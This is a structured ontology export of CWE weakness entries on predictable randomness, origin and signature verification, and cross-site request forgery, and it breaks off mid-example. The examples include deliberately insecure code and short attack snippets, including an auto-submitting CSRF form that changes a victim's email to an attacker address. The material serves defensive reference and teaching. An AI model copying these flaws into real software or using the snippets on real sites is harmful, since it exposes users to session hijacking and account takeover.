     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Libraries or Frameworks

Use products or modules that conform to FIPS 140-2 [REF-267] to avoid obvious entropy problems. Consult FIPS 140-2 Annex C (\"Approved Random Number Generators\")."^^xsd:string, 
                 rdfs:comment "Use well vetted pseudo-random number generating algorithms with adequate length seeds. Pseudo-random number generators can produce predictable numbers if the generator is known and the seed can be guessed. A 256-bit seed is a good starting point for producing a \"random enough\" number."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     other  "Varies by Context"^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Libraries or Frameworks

Use products or modules that conform to FIPS 140-2 [REF-267] to avoid obvious entropy problems. Consult FIPS 140-2 Annex C (\"Approved Random Number Generators\")."^^xsd:string
                 
                 requirements  ""^^xsd:string
    
    
Individual: CWE-341_Predictable_from_Observable_State

    Annotations: 
        rdfs:comment "A number or object is predictable based on observations that the attacker can make about the state of the system or network, such as time, process ID, etc."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     
     Annotations: rdfs:comment "DNS resolver library uses predictable IDs, which allows a local attacker to spoof DNS query results."^^xsd:string
                 
                 related_attack_patterns  CVE-2000-0335,
     
     Annotations: rdfs:comment "PRNG allows attackers to use the output of small PRNG requests to determine the internal state information, which could be used by attackers to predict future pseudo-random numbers."^^xsd:string
                 
                 related_attack_patterns  CVE-2001-1141,
     
     Annotations: rdfs:comment "Mail server stores private mail messages with predictable filenames in a world-executable directory, which allows local users to read private mailing list archives."^^xsd:string
                 
                 related_attack_patterns  CVE-2002-0389,
     
     Annotations: rdfs:comment "MFV. predictable filename and insecure permissions allows file modification to execute SQL queries."^^xsd:string
                 
                 related_attack_patterns  CVE-2005-1636,
     ID  "341"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Libraries or Frameworks
Use products or modules that conform to FIPS 140-2 [REF-267] to avoid obvious entropy problems. Consult FIPS 140-2 Annex C (\"Approved Random Number Generators\")."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "This code generates a unique random identifier for a user's session.

Example Language: PHP  /* (bad code) */
function generateSessionID($userID){
srand($userID);
return rand();
}
Because the seed for the PRNG is always the user's ID, the session ID will always be the same. An attacker could thus predict any user's session ID and potentially hijack the session.

This example also exhibits a Small Seed Space (CWE-339)."^^xsd:string
                 
                 demonstrative_examples  "",
     
     Annotations: rdfs:comment "Increase the entropy used to seed a PRNG."^^xsd:string, 
                 rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Use a PRNG that periodically re-seeds itself using input from high-quality sources, such as hardware devices with high entropy. However, do not re-seed too frequently, or else the entropy source might block."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "This weakness could be exploited by an attacker in a number ways depending on the context. If a predictable number is used to generate IDs or keys that are used within protection mechanisms, then an attacker could gain unauthorized access to the system. If predictable filenames are used for storing sensitive information, then an attacker might gain access to the system and may be able to gain access to the information in the file."^^xsd:string
                 
                 other  "Varies by Context",
     
     Annotations: rdfs:comment "Strategy: Libraries or Frameworks
Use products or modules that conform to FIPS 140-2 [REF-267] to avoid obvious entropy problems. Consult FIPS 140-2 Annex C (\"Approved Random Number Generators\")."^^xsd:string
                 
                 requirements  ""^^xsd:string
    
    
Individual: CWE-345_Insufficient_Verification_of_Data_Authenticity

    Annotations: 
        rdfs:comment "Maintenance:
The specific ways in which the origin is not properly identified should be laid out as separate weaknesses. In some sense, this is more like a category."^^xsd:string,
        rdfs:comment "Relationship:
\"origin validation\" could fall under this."^^xsd:string,
        rdfs:comment "The software does not sufficiently verify the origin or authenticity of data, in a way that causes it to accept invalid data."^^xsd:string
    
    Types: 
        Classes
    
    Facts:  
     categories_member  CWE-1014_Identify_Actors,
     
     Annotations: rdfs:comment "JSON Hijacking (aka JavaScript Hijacking)"^^xsd:string
                 
                 related_attack_patterns  CAPEC-111,
     
     Annotations: rdfs:comment "Cache Poisoning"^^xsd:string
                 
                 related_attack_patterns  CAPEC-141,
     
     Annotations: rdfs:comment "DNS Cache Poisoning"^^xsd:string
                 
                 related_attack_patterns  CAPEC-142,
     
     Annotations: rdfs:comment "Spoofing of UDDI/ebXML Messages"^^xsd:string
                 
                 related_attack_patterns  CAPEC-148,
     
     Annotations: rdfs:comment "Spoofing of UDDI/ebXML Messages"^^xsd:string
                 
                 related_attack_patterns  CAPEC-218,
     
     Annotations: rdfs:comment "Application API Message Manipulation via Man-in-the-Middle"^^xsd:string
                 
                 related_attack_patterns  CAPEC-384,
     
     Annotations: rdfs:comment "Transaction or Event Tampering via Application API Manipulation"^^xsd:string
                 
                 related_attack_patterns  CAPEC-385,
     
     Annotations: rdfs:comment "Application API Navigation Remapping"^^xsd:string
                 
                 related_attack_patterns  CAPEC-386,
     
     Annotations: rdfs:comment "Navigation Remapping To Propagate Malicious Content"^^xsd:string
                 
                 related_attack_patterns  CAPEC-387,
     
     Annotations: rdfs:comment "Application API Button Hijacking"^^xsd:string
                 
                 related_attack_patterns  CAPEC-388,
     
     Annotations: rdfs:comment "Content Spoofing Via Application API Manipulation"^^xsd:string
                 
                 related_attack_patterns  CAPEC-389,
     
     Annotations: rdfs:comment "Using Alternative IP Address Encodings"^^xsd:string
                 
                 related_attack_patterns  CAPEC-4,
     ID  "345"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Unexpected State"^^xsd:string,
     integrity  "Varies by Context"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     other  "Unexpected State"^^xsd:string,
     other  "Varies by Context"^^xsd:string
    
    
Individual: CWE-346_Origin_Validation_Error

    Annotations: 
        rdfs:comment "Maintenance:
This entry has some significant overlap with other CWE entries and may need some clarification. See terminology notes."^^xsd:string,
        rdfs:comment "Terminology:
The \"Origin Validation Error\" term was used by Taimur Aslam in his August 1995 thesis. Although not formally defined, an issue is considered to be an origin validation error if either (1) \"an object [accepts] input from an unauthorized subject,\" or (2) \"the system [fails] to properly or completely authenticate a subject.\" A later section says that an origin validation error can occur when the system (1) \"does not properly authenticate a user or process\" or (2) \"does not properly authenticate the shared data or libraries.\" The only example provided in the thesis (covered by OSVDB:57615) involves a setuid program running command-line arguments without dropping privileges. So, this definition (and its examples in the thesis) effectively cover other weaknesses such as CWE-287 (Improper Authentication), CWE-285 (Improper Authorization), and CWE-250 (Execution with Unnecessary Privileges). There appears to be little usage of this term today, except in the SecurityFocus vulnerability database, where the term is used for a variety of issues, including web-browser problems that allow violation of the Same Origin Policy and improper validation of the source of an incoming message."^^xsd:string,
        rdfs:comment "The software does not properly verify that the source of data or communication is valid."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1014_Identify_Actors,
     
     Annotations: rdfs:comment "product does not sufficiently distinguish external HTML from internal, potentially dangerous HTML, allowing bypass using special strings in the page title. Overlaps special elements."^^xsd:string
                 
                 references  CVE-1999-1549,
     
     Annotations: rdfs:comment "DNS server can accept DNS updates from hosts that it did not query, leading to cache poisoning"^^xsd:string
                 
                 references  CVE-2000-1218,
     
     Annotations: rdfs:comment "DNS server caches glue records received from non-delegated name servers"^^xsd:string
                 
                 references  CVE-2001-1452,
     
     Annotations: rdfs:comment "LDAP service does not verify if a particular attribute was set by the LDAP server"^^xsd:string
                 
                 references  CVE-2003-0174,
     
     Annotations: rdfs:comment "product records the reverse DNS name of a visitor in the logs, allowing spoofing and resultant XSS."^^xsd:string
                 
                 references  CVE-2003-0981,
     
     Annotations: rdfs:comment "DNS server can accept DNS updates from hosts that it did not query, leading to cache poisoning"^^xsd:string
                 
                 references  CVE-2005-0877,
     
     Annotations: rdfs:comment "user ID obtained from untrusted source (URL)"^^xsd:string
                 
                 references  CVE-2005-2188,
     
     Annotations: rdfs:comment "JSON Hijacking (aka JavaScript Hijacking)"^^xsd:string
                 
                 related_attack_patterns  CAPEC-111,
     
     Annotations: rdfs:comment "Cache Poisoning"^^xsd:string
                 
                 related_attack_patterns  CAPEC-141,
     
     Annotations: rdfs:comment "DNS Cache Poisoning"^^xsd:string
                 
                 related_attack_patterns  CAPEC-142,
     
     Annotations: rdfs:comment "Exploitation of Trusted Credentials"^^xsd:string
                 
                 related_attack_patterns  CAPEC-21,
     
     Annotations: rdfs:comment "Application API Message Manipulation via Man-in-the-Middle"^^xsd:string
                 
                 related_attack_patterns  CAPEC-384,
     
     Annotations: rdfs:comment "Transaction or Event Tampering via Application API Manipulation"^^xsd:string
                 
                 related_attack_patterns  CAPEC-385,
     
     Annotations: rdfs:comment "Application API Navigation Remapping"^^xsd:string
                 
                 related_attack_patterns  CAPEC-386,
     
     Annotations: rdfs:comment "Navigation Remapping To Propagate Malicious Content"^^xsd:string
                 
                 related_attack_patterns  CAPEC-387,
     
     Annotations: rdfs:comment "Application API Button Hijacking"^^xsd:string
                 
                 related_attack_patterns  CAPEC-388,
     
     Annotations: rdfs:comment "Content Spoofing Via Application API Manipulation"^^xsd:string
                 
                 related_attack_patterns  CAPEC-389,
     
     Annotations: rdfs:comment "SaaS User Request Forgery"^^xsd:string
                 
                 related_attack_patterns  CAPEC-510,
     
     Annotations: rdfs:comment "Session Credential Falsification through Prediction"^^xsd:string
                 
                 related_attack_patterns  CAPEC-59,
     
     Annotations: rdfs:comment "Reusing Session IDs (aka Session Replay)"^^xsd:string
                 
                 related_attack_patterns  CAPEC-60,
     
     Annotations: rdfs:comment "Manipulating Writeable Configuration Files"^^xsd:string
                 
                 related_attack_patterns  CAPEC-75,
     
     Annotations: rdfs:comment "Manipulating Web Input to File System Calls"^^xsd:string
                 
                 related_attack_patterns  CAPEC-76,
     
     Annotations: rdfs:comment "Pharming"^^xsd:string
                 
                 related_attack_patterns  CAPEC-89,
     ID  "346"^^xsd:positiveInteger,
     access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     access_control  "Varies by Context"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "An attacker can access any functionality that is inadvertently accessible to the source."^^xsd:string, 
                 rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Example 1
This Android application will remove a user account when it receives an intent to do so:

Example Language: Java   /* (bad code) */
IntentFilter filter = new IntentFilter(\"com.example.RemoveUser\");
MyReceiver receiver = new MyReceiver();
registerReceiver(receiver, filter);

public class DeleteReceiver extends BroadcastReceiver {
@Override
public void onReceive(Context context, Intent intent) {
int userID = intent.getIntExtra(\"userID\");
destroyUserData(userID);
}
}
This application does not check the origin of the intent, thus allowing any malicious application to remove a user. Always check the origin of an intent, or create a whitelist of trusted applications using the manifest.xml file."^^xsd:string, 
                 rdfs:comment "Example 2
These Android and iOS applications intercept URL loading within a WebView and perform special actions if a particular URL scheme is used, thus allowing the Javascript within the WebView to communicate with the application:

Example Language: Java  /* (bad code) */

// Android 
@Override
public boolean shouldOverrideUrlLoading(WebView view, String url){
if (url.substring(0,14).equalsIgnoreCase(\"examplescheme:\")){
if(url.substring(14,25).equalsIgnoreCase(\"getUserInfo\")){
writeDataToView(view, UserData);
return false;
}
else{
return true;
}
}
}

Example Language: Objective-C   /* (bad code) */

// iOS 
-(BOOL) webView:(UIWebView *)exWebView shouldStartLoadWithRequest:(NSURLRequest *)exRequest navigationType:(UIWebViewNavigationType)exNavigationType
{
NSURL *URL = [exRequest URL];
if ([[URL scheme] isEqualToString:@\"exampleScheme\"])
{
NSString *functionString = [URL resourceSpecifier];
if ([functionString hasPrefix:@\"specialFunction\"])
{

// Make data available back in webview. 
UIWebView *webView = [self writeDataToView:[URL query]];
}
return NO;
}
return YES;
}
A call into native code can then be initiated by passing parameters within the URL:

(attack code)
Example Language: JavaScript 
window.location = examplescheme://method?parameter=value
Because the application does not check the source, a malicious website loaded within this WebView has the same access to the API as a trusted site."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     other  "Gain Privileges or Assume Identity"^^xsd:string,
     other  "Varies by Context"^^xsd:string,
     
     Annotations: rdfs:comment "where the weakness exists independent of other weaknesses"^^xsd:string
                 
                 weakness_ordinalities  "Primary"^^xsd:string,
     
     Annotations: rdfs:comment "where the weakness is typically related to the presence of some other weaknesses"^^xsd:string
                 
                 weakness_ordinalities  "Resultant"^^xsd:string
    
    
Individual: CWE-347_Improper_Verification_of_Cryptographic_Signature

    Annotations: 
        rdfs:comment "The software does not verify, or incorrectly verifies, the cryptographic signature for data."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1013_Encrypt_Data,
     
     Annotations: rdfs:comment "Accepts a configuration file without a Message Integrity Check (MIC) signature."^^xsd:string
                 
                 references  CVE-2002-1706,
     
     Annotations: rdfs:comment "Does not properly verify signatures for \"trusted\" entities."^^xsd:string
                 
                 references  CVE-2002-1796,
     
     Annotations: rdfs:comment "Insufficient verification allows spoofing."^^xsd:string
                 
                 references  CVE-2005-2181,
     
     Annotations: rdfs:comment "Insufficient verification allows spoofing."^^xsd:string
                 
                 references  CVE-2005-2182,
     
     Annotations: rdfs:comment "Padding Oracle Crypto Attack"^^xsd:string
                 
                 related_attack_patterns  CAPEC-463,
     ID  "347"^^xsd:positiveInteger,
     access_control  "Execute Unauthorized Code or Commands"^^xsd:string,
     access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     access_control  "Modify Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "An attacker could gain access to sensitive data and possibly execute unauthorized code."^^xsd:string, 
                 rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Execute Unauthorized Code or Commands"^^xsd:string,
     confidentiality  "Gain Privileges or Assume Identity"^^xsd:string,
     confidentiality  "Modify Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "In the following code, a JarFile object is created from a downloaded file.

(bad code)
Example Language: Java 
File f = new File(downloadedFilePath);
JarFile jf = new JarFile(f);
The JAR file that was potentially downloaded from an untrusted source is created without verifying the signature (if present). An alternate constructor that accepts a boolean verify parameter should be used instead."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Execute Unauthorized Code or Commands"^^xsd:string,
     integrity  "Gain Privileges or Assume Identity"^^xsd:string,
     integrity  "Modify Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-349_Acceptance_of_Extraneous_Untrusted_Data_With_Trusted_Data

    Annotations: 
        rdfs:comment "The software, when processing trusted data, accepts any untrusted data that is also included with the trusted data, treating the untrusted data as if it were trusted."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1019_Validate_Inputs,
     
     Annotations: rdfs:comment "Does not verify that trusted entity is authoritative for all entities in its response."^^xsd:string
                 
                 references  CVE-2002-0018,
     
     Annotations: rdfs:comment "Cache Poisoning"^^xsd:string
                 
                 related_attack_patterns  CAPEC-141,
     
     Annotations: rdfs:comment "DNS Cache Poisoning"^^xsd:string
                 
                 related_attack_patterns  CAPEC-142,
     
     Annotations: rdfs:comment "Manipulating Writeable Configuration Files"^^xsd:string
                 
                 related_attack_patterns  CAPEC-75,
     ID  "349"^^xsd:positiveInteger,
     access_control  "Bypass Protection Mechanism"^^xsd:string,
     access_control  "Modify Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "An attacker could package untrusted data with trusted data to bypass protection mechanisms to gain access to and possibly modify sensitive data."^^xsd:string, 
                 rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     implementation  ""^^xsd:string,
     integrity  "Bypass Protection Mechanism"^^xsd:string,
     integrity  "Modify Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-352_Cross-Site_Request_Forgery

    Annotations: 
        rdfs:comment "Alternate Terms:
- Session Riding	
- Cross Site Reference Forgery	
- XSRF"^^xsd:string,
        rdfs:comment "Relationship:
There can be a close relationship between XSS and CSRF (CWE-352). An attacker might use CSRF in order to trick the victim into submitting requests to the server in which the requests contain an XSS payload. A well-known example of this was the Samy worm on MySpace [REF-956]. The worm used XSS to insert malicious HTML sequences into a user's profile and add the attacker as a MySpace friend. MySpace friends of that victim would then execute the payload to modify their own profiles, causing the worm to propagate exponentially. Since the victims did not intentionally insert the malicious script themselves, CSRF was a root cause."^^xsd:string,
        rdfs:comment "The web application does not, or can not, sufficiently verify whether a well-formed, valid, consistent request was intentionally provided by the user who submitted the request."^^xsd:string,
        rdfs:comment "Theoretical
The CSRF topology is multi-channel:
1. Attacker (as outsider) to intermediary (as user). The interaction point is either an external or internal channel.
2. Intermediary (as user) to server (as victim). The activation point is an internal channel."^^xsd:string,
        rdfs:comment "When a web server is designed to receive a request from a client without any mechanism for verifying that it was intentionally sent, then it might be possible for an attacker to trick a client into making an unintentional request to the web server which will be treated as an authentic request. This can be done via a URL, image load, XMLHttpRequest, etc. and can result in exposure of data or unintended code execution."^^xsd:string
    
    Types: 
        Compound
    
    Facts:  
     categories_member  CWE-1019_Validate_Inputs,
     
     Annotations: rdfs:comment "Add user accounts via a URL in an img tag"^^xsd:string
                 
                 references  CVE-2004-1703,
     
     Annotations: rdfs:comment "Gain administrative privileges via a URL in an img tag"^^xsd:string
                 
                 references  CVE-2004-1842,
     
     Annotations: rdfs:comment "Arbitrary code execution by specifying the code in a crafted img tag or URL"^^xsd:string
                 
                 references  CVE-2004-1967,
     
     Annotations: rdfs:comment "Add user accounts via a URL in an img tag"^^xsd:string
                 
                 references  CVE-2004-1995,
     
     Annotations: rdfs:comment "Perform actions as administrator via a URL or an img tag"^^xsd:string
                 
                 references  CVE-2005-1674,
     
     Annotations: rdfs:comment "Delete a victim's information via a URL or an img tag"^^xsd:string
                 
                 references  CVE-2005-1947,
     
     Annotations: rdfs:comment "Change another user's settings via a URL or an img tag"^^xsd:string
                 
                 references  CVE-2005-2059,
     
     Annotations: rdfs:comment "CMS allows modification of configuration via CSRF attack against the administrator"^^xsd:string
                 
                 references  CVE-2009-3022,
     
     Annotations: rdfs:comment "modify password for the administrator"^^xsd:string
                 
                 references  CVE-2009-3520,
     
     Annotations: rdfs:comment "web interface allows password changes or stopping a virtual machine via CSRF"^^xsd:string
                 
                 references  CVE-2009-3759,
     
     Annotations: rdfs:comment "JSON Hijacking (aka JavaScript Hijacking)"^^xsd:string
                 
                 related_attack_patterns  CAPEC-111,
     
     Annotations: rdfs:comment "Cross-Domain Search Timing"^^xsd:string
                 
                 related_attack_patterns  CAPEC-462,
     
     Annotations: rdfs:comment "Cross Site Identification"^^xsd:string
                 
                 related_attack_patterns  CAPEC-467,
     
     Annotations: rdfs:comment "Cross Site Request Forgery"^^xsd:string
                 
                 related_attack_patterns  CAPEC-62,
     ID  "352"^^xsd:positiveInteger,
     access_control  "Bypass Protection Mechanism"^^xsd:string,
     access_control  "DoS: Crash, Exit, or Restart"^^xsd:string,
     access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     access_control  "Modify Application Data"^^xsd:string,
     access_control  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Do not use the GET method for any request that triggers a state change."^^xsd:string, 
                 rdfs:comment "Generate a unique nonce for each form, place the nonce into the form, and verify the nonce upon receipt of the form. Be sure that the nonce is not predictable (CWE-330).
Note: Note that this can be bypassed using XSS (CWE-79)."^^xsd:string, 
                 rdfs:comment "Identify especially dangerous operations. When the user performs a dangerous operation, send a separate confirmation request to ensure that the user intended to perform that operation.
Note: Note that this can be bypassed using XSS (CWE-79)."^^xsd:string, 
                 rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Strategy: Libraries or Frameworks

Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.
For example, use anti-CSRF packages such as the OWASP CSRFGuard. 
Another example is the ESAPI Session Management control, which includes a component for CSRF."^^xsd:string, 
                 rdfs:comment "Use the \"double-submitted cookie\" method as described by Felten and Zeller:
When a user visits a site, the site should generate a pseudorandom value and set it as a cookie on the user's machine. The site should require every form submission to include this value as a form value and also as a cookie value. When a POST request is sent to the site, the request should only be considered valid if the form value and the cookie value are the same.
Because of the same-origin policy, an attacker cannot read or modify the value stored in the cookie. To successfully submit a form on behalf of the user, the attacker would have to correctly guess the pseudorandom value. If the pseudorandom value is cryptographically strong, this will be prohibitively difficult.
This technique requires Javascript, so it may not work for browsers that have Javascript disabled. [REF-331]
Note: Note that this can probably be bypassed using XSS (CWE-79), or when using web technologies that enable the attacker to read raw headers from HTTP requests."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)
Formal Methods / Correct-By-Construction
Effectiveness: SOAR Partial"^^xsd:string
                 
                 architecture_or_design_review  ""^^xsd:string,
     availability  "Bypass Protection Mechanism"^^xsd:string,
     availability  "DoS: Crash, Exit, or Restart"^^xsd:string,
     availability  "Gain Privileges or Assume Identity"^^xsd:string,
     availability  "Modify Application Data"^^xsd:string,
     availability  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The consequences will vary depending on the nature of the functionality that is vulnerable to CSRF. An attacker could effectively perform any operations as the victim. If the victim is an administrator or privileged user, the consequences may include obtaining complete control over the web application - deleting or stealing data, uninstalling the product, or using it to launch other attacks against all of the product's users. Because the attacker has the identity of the victim, the scope of CSRF is limited only by the victim's privileges."^^xsd:string, 
                 rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Bypass Protection Mechanism"^^xsd:string,
     confidentiality  "DoS: Crash, Exit, or Restart"^^xsd:string,
     confidentiality  "Gain Privileges or Assume Identity"^^xsd:string,
     confidentiality  "Modify Application Data"^^xsd:string,
     confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "This example PHP code attempts to secure the form submission process by validating that the user submitting the form has a valid session. A CSRF attack would not be prevented by this countermeasure because the attacker forges a request through the user's web browser in which a valid session already exists.

The following HTML is intended to allow a user to update a profile.

(bad code)
Example Language: HTML 
<form action=\"/url/profile.php\" method=\"post\">
<input type=\"text\" name=\"firstname\"/>
<input type=\"text\" name=\"lastname\"/>
<br/>
<input type=\"text\" name=\"email\"/>
<input type=\"submit\" name=\"submit\" value=\"Update\"/>
</form>
profile.php contains the following code.

(bad code)
Example Language: PHP 
// initiate the session in order to validate sessions

session_start();

//if the session is registered to a valid user then allow update 

if (! session_is_registered(\"username\")) {

echo \"invalid session detected!\";

// Redirect user to login page 
[...]

exit;
}

// The user session is valid, so process the request 

// and update the information 

update_profile();

function update_profile {

// read in the data from $POST and send an update 

// to the database 
SendUpdateToDatabase($_SESSION['username'], $_POST['email']);
[...]
echo \"Your profile has been successfully updated.\";
}
This code may look protected since it checks for a valid session. However, CSRF attacks can be staged from virtually any tag or HTML construct, including image tags, links, embed or object tags, or other attributes that load background images.

The attacker can then host code that will silently change the username and email address of any user that visits the page while remaining logged in to the target web application. The code might be an innocent-looking web page such as:

(attack code)
Example Language: HTML 
<SCRIPT>
function SendAttack () {
form.email = \"attacker@example.com\";
// send to profile.php 
form.submit();
}
</SCRIPT>

<BODY onload=\"javascript:SendAttack();\">

